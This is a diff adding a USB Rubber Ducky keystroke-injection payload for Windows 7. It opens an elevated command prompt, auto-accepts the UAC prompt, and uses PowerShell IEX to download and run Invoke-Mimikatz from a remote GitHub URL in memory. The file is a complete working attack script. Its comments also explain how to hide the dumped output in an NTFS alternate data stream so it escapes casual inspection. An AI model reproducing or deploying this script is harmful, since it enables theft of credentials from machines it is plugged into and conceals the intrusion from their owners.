@@ -1,0 +1,27 @@
+REM **************************************************
+REM Payload: Download and execute a payload hosted here.
+REM Target: Window 7
+REM Author: Carl Pearce 
+REM Based on the Download and execute Mimikatz in memory by Charles Worrell
+REM Based on UAC bypass by Darren Kitchen
+REM **************************************************
+DEFINE URL https://raw.githubusercontent.com/binarycanary/usb-rubber-ducky--mimikatz-in-mem/master/Invoke-Mimikatz.ps1
+DELAY 1000
+GUI r
+DELAY 3000
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 3000
+ALT y
+DELAY 500
+STRING powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('URL')"
+ENTER
+REM **************************************************
+REM Alternate piping of output
+REM **************************************************
+REM ** Pipe output to a file on desktop. Send it to an alternate data stream so its not as easy to find :)
+REM ** To open up the ADS: notepad %USERPROFILE%\Desktop\NewTextDocument.txt:hiddenADS.txt
+REM ** If someone happens to open NewTextDocument.txt (notepad %USERPROFILE%\Desktop\NewTextDocument.txt) they wont see anything. Need streams to detect.
+REM powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('URL')" > %USERPROFILE%\Desktop\NewTextDocument.txt:hiddenADS.txt 2>&1
+REM *** Just dump output in command window
+REM powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('URL')"
